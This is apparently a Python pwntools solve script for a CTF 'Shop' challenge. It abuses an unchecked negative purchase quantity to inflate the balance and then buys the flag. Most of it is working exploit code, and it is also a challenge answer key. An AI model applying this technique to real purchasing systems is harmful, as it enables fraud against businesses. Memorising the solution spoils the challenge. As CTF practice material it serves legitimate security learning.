#!/usr/bin/env python3
# solve_shop.py
# Author: moriarty
# Solves the "Shop" challenge from LYKN CTF by exploiting the
# negative-quantity signed-integer underflow in the buy command.
#
# Vulnerability summary
# ---------------------
#   The shop computes a SIGNED 32-bit total cost:
#       total_cost = price[item] * quantity
#       new_balance = balance - total_cost
#   `quantity` is read from stdin without any sign/range check, so a negative
#   value produces a negative total cost, which (when subtracted from the
#   balance) actually INCREASES the balance. The affordability check passes
#   because a negative cost is trivially "affordable".
#
#   Two-step exploit:
#     1. Buy quantity -1 of The Flag (item 3, price 36_363_636):
#            new_balance = 1836 - (36363636 * -1) = 36_365_472
#     2. Buy quantity 1 of The Flag for real — now affordable.
#     3. The binary prints the flag on a successful flag purchase.
#
# Usage
# -----
#   cd <dir containing `shop` binary>
#   python3 solve_shop.py
#
# Swap "shop" for "shop.exe" on Windows; the rest of the script is unchanged.
# It also works directly against a remote TCP service if you replace the
# `process(...)` line with `remote(host, port)`.

import os
import sys
from pwn import process, context, log

context.log_level = "warn"   # quiet pwntools; set to "info" for full debug

# Default: look for `shop` next to this script, then in the current working dir.
# Override by passing the path as the first CLI argument:
#     python3 solve_shop.py /path/to/shop
HERE = os.path.dirname(os.path.abspath(__file__)) or "."
BINARY = sys.argv[1] if len(sys.argv) > 1 else os.path.join(HERE, "shop")
if not os.path.exists(BINARY):
    BINARY = "./shop"          # fallback for cwd-based runs / Windows shop.exe
FLAG_ITEM = 3
WRAP_QTY = -1                 # negative quantity -> negative total_cost
BUY_QTY = 1                   # the real purchase once balance is inflated


def buy(p, idx: int, qty: int) -> str:
    """Issue a `b` command and return the textual response block."""
    p.sendline(b"b")
    p.recvuntil(b"Item index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Quantity: ")
    p.sendline(str(qty).encode())
    return p.recvuntil(b">", drop=True).decode(errors="replace")


def grab_flag(*blocks: str) -> str | None:
    """Find the first LYKNCTF{...} substring in any of the given text blocks."""
    import re
    for block in blocks:
        m = re.search(r"LYKNCTF\{[^}]+\}", block)
        if m:
            return m.group(0)
    return None


def main() -> None:
    p = process(BINARY)
    p.recvuntil(b">", )      # skip the initial catalog dump + first menu prompt

    blocks = []

    # Step 1 — inflate the balance via the underflow.
    blocks.append(buy(p, FLAG_ITEM, WRAP_QTY))
    log.info("after wraparound: %s", blocks[-1].strip().splitlines()[0])

    # Step 2 — buy the flag for real. The flag is printed inside this block.
    blocks.append(buy(p, FLAG_ITEM, BUY_QTY))
    log.info("after purchase:  %s", blocks[-1].strip().splitlines()[0])

    # Step 3 — quit and also harvest trailing stdout, just in case.
    p.sendline(b"q")
    p.recvall(timeout=2)
    p.close()

    flag = grab_flag(*blocks)
    if flag:
        # Use print() so the flag is always visible regardless of log_level.
        print(f"[+] FLAG => {flag}")
    else:
        print("[-] flag not found in captured output:")
        for i, b in enumerate(blocks):
            print(f"    block {i}:\n{b}")


if __name__ == "__main__":
    main()